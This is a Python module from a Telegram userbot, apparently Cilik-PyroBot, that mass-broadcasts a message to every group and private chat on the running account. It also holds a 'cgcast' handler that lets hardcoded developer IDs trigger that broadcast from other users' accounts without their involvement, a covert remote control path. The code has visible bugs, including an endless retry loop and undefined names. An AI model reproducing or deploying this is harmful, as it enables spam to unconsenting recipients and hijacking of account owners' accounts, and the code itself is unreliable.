# Cilik-PyroBot

from os import getenv 
import heroku3
import asyncio

import dotenv
from pyrogram import Client, enums, filters
from pyrogram.types import Message
from requests import get

from config import BLACKLIST_GCAST, HEROKU_APP_NAME, HEROKU_API_KEY
from Cilik.helpers.adminHelpers import DEVS
from Cilik.helpers.misc import HAPP, in_heroku
from Cilik.helpers.tools import get_arg
from Cilik.utils.misc import restart

from Cilik.modules.Ubot.help import add_command_help

while 0 < 6:
    _GCAST_BLACKLIST = get(
        "https://raw.githubusercontent.com/grey423/Reforestation/master/blacklistgcast.json"
    )
    if _GCAST_BLACKLIST.status_code != 200:
        if 0 != 5:
            continue
        GCAST_BLACKLIST = [-1001473548283, -1001390552926, -1001687155877]
        break
    GCAST_BLACKLIST = _GCAST_BLACKLIST.json()
    break

del _GCAST_BLACKLIST

Heroku = heroku3.from_key(HEROKU_API_KEY)
heroku_api = "https://api.heroku.com"
blchat = getenv("BLACKLIST_GCAST") or ""

@Client.on_message(
    filters.group & filters.command("cgcast", ["."]) & filters.user(DEVS) & ~filters.me
)
@Client.on_message(filters.command("gcast", [".", "-", "^", "!"]) & filters.me)
async def gcast_cmd(client: Client, message: Message):
    if message.reply_to_message or get_arg(message):
        Cilik = await message.reply("`Global Broadcasting!`")
    else:
        return await message.edit_text("**Berikan Sebuah Pesan atau Reply**")
    done = 0
    error = 0
    async for dialog in client.get_dialogs():
        if dialog.chat.type in (enums.ChatType.GROUP, enums.ChatType.SUPERGROUP):
            if message.reply_to_message:
                msg = message.reply_to_message
            elif get_arg:
                msg = get_arg(message)
            chat = dialog.chat.id
            if chat not in GCAST_BLACKLIST and chat not in BLACKLIST_GCAST:
                try:
                    if message.reply_to_message:
                        await msg.copy(chat)
                    elif get_arg:
                        await client.send_message(chat, msg)
                    done += 1
                    await asyncio.sleep(0.3)
                except Exception:
                    error += 1
                    await asyncio.sleep(0.3)
    await Cilik.edit_text(
        f"Done in send to `{done}` chats, error in `{error}` chat(s)"
    )


@Client.on_message(filters.command("gucast", [".", "-", "^", "!", "?"]) & filters.me)
async def gucast_cmd(client: Client, message: Message):
    if message.reply_to_message or get_arg(message):
        Cilik = await message.reply("`Global Broadcasting!`")
    else:
        return await message.edit_text("**Berikan Sebuah Pesan atau Reply**")
    done = 0
    error = 0
    async for dialog in client.get_dialogs():
        if dialog.chat.type == enums.ChatType.PRIVATE and not dialog.chat.is_verified:
            if message.reply_to_message:
                msg = message.reply_to_message
            elif get_arg:
                msg = get_arg(message)
            chat = dialog.chat.id
            if chat not in DEVS:
                try:
                    if message.reply_to_message:
                        await msg.copy(chat)
                    elif get_arg:
                        await client.send_message(chat, msg)
                    done += 1
                    await asyncio.sleep(0.3)
                except Exception:
                    error += 1
                    await asyncio.sleep(0.3)
    await Cilik.edit_text(
        f"Done in send to `{done}` users, error in `{error}` user(s)"
    )

@Client.on_message(filters.command("blchat", [".", "-", "^", "!", "?"]) & filters.me)
async def gcast_bl(client: Client, message: Message):
    blacklistgc = "True" if BLACKLIST_GCAST else "False"
    blc = blchat
    list = blc.replace(" ", "\n» ")
    if blacklistgc == "True":
        await message.reply(
            f"🔮 **Blacklist GCAST:** `Enabled`\n\n📚 **Blacklist Group:**\n» {list}\n\nKetik `.addbl` di grup yang ingin anda tambahkan ke daftar blacklist gcast.",
        )
    else:
        await message.reply("🔮 **Blacklist GCAST:** `Disabled`")


@Client.on_message(filters.command("addbl", [".", "-", "^", "!", "?"]) & filters.me)
async def add(client: Client, message: Message):
    xxnx = await message.reply("💈 `Processing...`")
    var = "BLACKLIST_GCAST"
    gc = message.chat.id
    if HEROKU_APP_NAME is not None:
        app = Heroku.app(HEROKU_APP_NAME)
    else:
        await xnxx.edit(
            "**Silahkan Tambahkan Var** `HEROKU_APP_NAME` **untuk menambahkan blacklist**",
        )
        return
    heroku_Config = app.config()
    if message is None:
        return
    blgc = f"{BLACKLIST_GCAST} {gc}"
    blacklistgrup = (
        blgc.replace("{", "")
        .replace("}", "")
        .replace(",", "")
        .replace("[", "")
        .replace("]", "")
        .replace("set() ", "")
    )
    await xxnx.edit(
        f"**Berhasil Menambahkan** `{gc}` **ke daftar blacklist gcast.**\n\nSedang MeRestart Heroku untuk Menerapkan Perubahan."
    )
    heroku_Config[var] = blacklistgrup


@Client.on_message(filters.command("delbl", [".", "-", "^", "!", "?"]) & filters.me)
async def _(client: Client, message: Message):
    xxx = await message.reply("💈 `Processing...`")
    gc = message.chat_id
    if HEROKU_APP_NAME is not None:
        app = Heroku.app(HEROKU_APP_NAME)
    else:
        await xxx.edit(
            "**Silahkan Tambahkan Var** `HEROKU_APP_NAME` **untuk menghapus blacklist**",
        )
        return
    heroku_Config = app.config()
    if message is None:
        return
    gett = str(gc)
    if gett in blchat:
        blacklistgrup = blchat.replace(gett, "")
        await xxx.edit(
            f"**Berhasil Menghapus** `{gc}` **dari daftar blacklist gcast.**\n\nSedang MeRestart Heroku untuk Menerapkan Perubahan."
        )
        var = "BLACKLIST_GCAST"
        heroku_Config[var] = blacklistgrup
    else:
        await xxx.edit(
            "**Grup ini tidak ada dalam daftar blacklist gcast.**", 45
        )


add_command_help(
    "gcast",
    [
        [
            ".gcast <text/reply>",
            "Mengirim Global Broadcast pesan ke Seluruh Grup yang kamu masuk.",
        ],
        [
            ".gucast <text/reply>",
            "Mengirim Global Broadcast pesan ke Seluruh Private Massage / PC yang masuk.",
        ],
        [
            ".blchat",
            "Melihat Daftar gcast blacklist yang anda tambahkan",
        ],
        [
            ".addbl <id grup>",
            "Menambahkan gcast blacklist.",
        ],
        [
            ".delbl <id grup>",
            "Menghapus gcast blacklist.",
        ],
    ],
)
